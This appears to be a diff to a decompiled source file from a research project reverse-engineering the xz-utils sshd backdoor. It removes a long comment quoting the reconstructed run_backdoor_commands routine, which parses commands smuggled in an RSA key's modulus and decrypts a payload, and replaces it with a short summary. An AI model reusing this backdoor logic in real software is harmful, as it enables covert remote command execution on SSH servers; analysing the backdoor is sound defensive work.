@@ -3,102 +3,11 @@
 // Calling convention: __stdcall
 // Prototype: BOOL __stdcall run_backdoor_commands(RSA * key, global_context_t * ctx, BOOL * do_orig)
 /*
- * AutoDoc: Generated from upstream sources.
- *
- * Source summary (xzre/xzre.h):
- *   @brief checks if the supplied RSA public key contains the backdoor commands, and executes them if present.
- *
- *   this function is called from function hooks. the output parameter @p do_orig
- *   will indicate to the caller if the original function should be invoked or not
- *
- *   @param key the public RSA key to check
- *   @param ctx the global context, used for the secret data (chacha key)
- *   @param do_orig output variable. will contain TRUE if the original function should be invoked, FALSE otherwise.
- *   @return BOOL TRUE if backdoor commands were invoked, FALSE otherwise
- *
- * Upstream implementation excerpt (xzre/xzre_code/run_backdoor_commands.c):
- *     #warning "this function is WIP / needs validation"
- *     
- *     /**
- *      * Copyright (C) 2024 Stefano Moioli <smxdev4@gmail.com>
- *      ** /
- *     #include "xzre.h"
- *     #include <assert.h>
- *     #include <openssl/bn.h>
- *     #include <string.h>
- *     #include <sys/select.h>
- *     #include <sys/types.h>
- *     #include <time.h>
- *     #include <errno.h>
- *     
- *     #define MONITOR_REQ_KEYALLOWED 22
- *     
- *     #define SIZE_STEP0 (sizeof(backdoor_payload_hdr_t))
- *     #define SIZE_STEP1 (SIZE_STEP0 + ED448_SIGNATURE_SIZE)
- *     #define SIZE_STEP2 (SIZE_STEP1 + sizeof(cmd_arguments_t))
- *     #define SIZE_HEADERS SIZE_STEP2
- *     #define SIZE_SYSTEM_EXTRA (sizeof(uid_t) + sizeof(gid_t))
- *     
- *     // $FIXME: move to xzre.h
- *     extern BOOL sshd_set_log_handler(cmd_arguments_t *args, global_context_t *ctx);
- *     
- *     BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
- *     	run_backdoor_commands_data_t f = {0};
- *     	f.p_do_orig = do_orig;
- *     
- *     	if(!ctx){
- *     		exit_early:
- *     		if(!do_orig){
- *     			return FALSE;
- *     		}
- *     		goto exit;
- *     	} else if(ctx->disable_backdoor
- *     		|| !rsa
- *     		|| !ctx->imported_funcs
- *     		|| !ctx->imported_funcs->RSA_get0_key
- *     		|| !ctx->imported_funcs->BN_bn2bin
- *     	){
- *     		ctx->disable_backdoor = TRUE;
- *     		goto exit_early;
- *     	}
- *     
- *     	if(do_orig){
- *     		do {
- *     			*f.p_do_orig = TRUE;
- *     		
- *     			ctx->imported_funcs->RSA_get0_key(
- *     				rsa, &f.kctx.rsa_n, &f.kctx.rsa_e, NULL);
- *     			if(!f.kctx.rsa_n || !f.kctx.rsa_e) break;
- *     			if(!ctx->imported_funcs) break;
- *     			if(!ctx->imported_funcs->BN_num_bits) break;
- *     			
- *     			int num_n_bits = ctx->imported_funcs->BN_num_bits(f.kctx.rsa_n);
- *     			if(num_n_bits > 0x4000) break;
- *     			
- *     			int num_n_bytes = X_BN_num_bytes(num_n_bits);
- *     			if(num_n_bytes > 536) break;
- *     			
- *     			int rsa_n_length = ctx->imported_funcs->BN_bn2bin(f.kctx.rsa_n, (u8 *)&f.kctx.payload);
- *     			if(rsa_n_length < 0) break;
- *     			if(num_n_bytes < rsa_n_length) break;
- *     
- *     			if(rsa_n_length <= sizeof(backdoor_payload_hdr_t)) goto exit;
- *     			// `field_a` cannot be 0
- *     			if(!f.kctx.payload.header.field_a) goto exit;
- *     			// `field_b` cannot be 0
- *     			if(!f.kctx.payload.header.field_b) goto exit;
- *     
- *     			u64 cmd_type = f.kctx.payload.header.field_c + (f.kctx.payload.header.field_b * f.kctx.payload.header.field_a);
- *     			if(cmd_type > 3) goto exit;
- *     
- *     			if(!ctx->libc_imports) break;
- *     			if(!ctx->libc_imports->getuid) break;
- *     			if(!ctx->libc_imports->exit) break;
- *     			if(!ctx->sshd_log_ctx) break;
- *     			if(ctx->num_shifted_bits != ED448_KEY_SIZE * 8) break;
- *     			*(backdoor_payload_hdr_t *)f.kctx.ivec = f.kctx.payload.header;
- *     ...
+ * AutoDoc: Central dispatcher invoked from the RSA hooks: it parses the forged modulus, decrypts staged payload chunks, verifies the ED448 signature, toggles sshd configuration/logging, and, if necessary, escalates through `sshd_proxy_elevate`. Every command the backdoor accepts flows through this routine before control returns to libcrypto.
  */
+
+#include "xzre_types.h"
+
 
 BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
 
